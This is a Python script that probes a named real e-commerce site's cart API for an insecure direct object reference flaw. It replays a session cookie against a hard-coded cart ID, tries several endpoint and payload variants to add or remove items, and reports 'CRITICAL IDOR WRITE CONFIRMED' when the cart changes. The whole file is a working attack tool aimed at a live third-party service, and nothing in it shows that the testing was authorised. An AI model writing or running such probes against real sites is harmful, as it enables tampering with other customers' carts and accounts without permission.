#!/usr/bin/env python3
"""
Complete cart write test - try ALL possible variations
"""

import requests
import json
import sys
import time

BASE_URL = "https://www.zooplus.de"
CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"

SESSION_COOKIE = sys.argv[1] if len(sys.argv) > 1 else None

if not SESSION_COOKIE:
    print("[!] Usage: python3 test_cart_write_complete.py <session_cookie>")
    sys.exit(1)

headers = {
    "Cookie": SESSION_COOKIE,
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "X-Requested-With": "XMLHttpRequest"
}

# Get cart state
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
cart_before = r.json()
before_count = len(cart_before.get("articles", []))
before_total = cart_before.get("summary", {}).get("grandTotal", 0)

print(f"[*] Complete cart write test")
print(f"[+] Cart before: {before_count} items, {before_total} EUR")
print()

# Try ALL possible endpoint variations
OFFER_ID = 2966095
ARTICLE_ID = 2966422

all_tests = [
    # Exact from instructions
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles", {"offerId": OFFER_ID}),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles", {"offerId": str(OFFER_ID)}),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles", {"offerId": f"1P.{OFFER_ID}"}),
    
    # /add endpoint
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/add", None, "form"),
    
    # Remove
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{ARTICLE_ID}/remove", None),
    
    # Try without /v2
    ("POST", f"/checkout/api/cart-api/cart/{CART_UUID}/articles", {"offerId": OFFER_ID}),
    
    # Try with different paths
    ("POST", f"/api/cart-api/v2/cart/{CART_UUID}/articles", {"offerId": OFFER_ID}),
    ("POST", f"/checkout/cart-api/v2/cart/{CART_UUID}/articles", {"offerId": OFFER_ID}),
]

successful = []

for test in all_tests:
    if len(test) == 4:
        method, endpoint, payload, form_type = test
    else:
        method, endpoint, payload = test
        form_type = None
    
    print(f"[*] {method} {endpoint}")
    if payload:
        print(f"    Payload: {json.dumps(payload)}")
    
    try:
        if form_type == "form":
            headers_form = headers.copy()
            headers_form["Content-Type"] = "application/x-www-form-urlencoded"
            r = requests.post(f"{BASE_URL}{endpoint}", headers=headers_form, 
                            data=f"offerId={OFFER_ID}&quantity=1", timeout=10)
        elif method == "POST":
            r = requests.post(f"{BASE_URL}{endpoint}", headers=headers, json=payload, timeout=10)
        else:
            r = requests.request(method, f"{BASE_URL}{endpoint}", headers=headers, json=payload, timeout=10)
        
        print(f"    HTTP {r.status_code}")
        
        if r.status_code in [200, 201, 204]:
            print(f"    [!!!] SUCCESS! HTTP {r.status_code}")
            print(f"    Response: {r.text[:500]}")
            successful.append((method, endpoint, payload, r.status_code, r.text[:500]))
            
            # Verify immediately
            time.sleep(1)
            r2 = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
            if r2.status_code == 200:
                cart_after = r2.json()
                after_count = len(cart_after.get("articles", []))
                if after_count != before_count:
                    print(f"    [!!!] VERIFIED: {before_count} -> {after_count} items")
                    print()
                    print("[!!!] ========================================")
                    print("[!!!] CRITICAL IDOR WRITE CONFIRMED!")
                    print("[!!!] ========================================")
                    print(f"[!!!] Working: {method} {endpoint}")
                    if payload:
                        print(f"[!!!] Payload: {json.dumps(payload)}")
                    sys.exit(0)
        elif r.status_code == 400:
            print(f"    [!] Bad Request: {r.text[:200]}")
        elif r.status_code == 403:
            print(f"    [X] Forbidden")
        elif r.status_code not in [404]:
            print(f"    Response: {r.text[:200]}")
    except Exception as e:
        print(f"    Error: {e}")

print()
print("[*] Final verification...")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code == 200:
    cart_after = r.json()
    after_count = len(cart_after.get("articles", []))
    after_total = cart_after.get("summary", {}).get("grandTotal", 0)
    print(f"[+] Cart after: {after_count} items, {after_total} EUR")
    
    if before_count != after_count or abs(before_total - after_total) > 0.01:
        print()
        print("[!!!] CART WAS MODIFIED!")
        print(f"[!!!] Before: {before_count} items, {before_total} EUR")
        print(f"[!!!] After:  {after_count} items, {after_total} EUR")

if successful:
    print()
    print("[!!!] WORKING ENDPOINTS:")
    for method, endpoint, payload, status, response in successful:
        print(f"[!!!] {method} {endpoint}")
        if payload:
            print(f"      Payload: {json.dumps(payload)}")

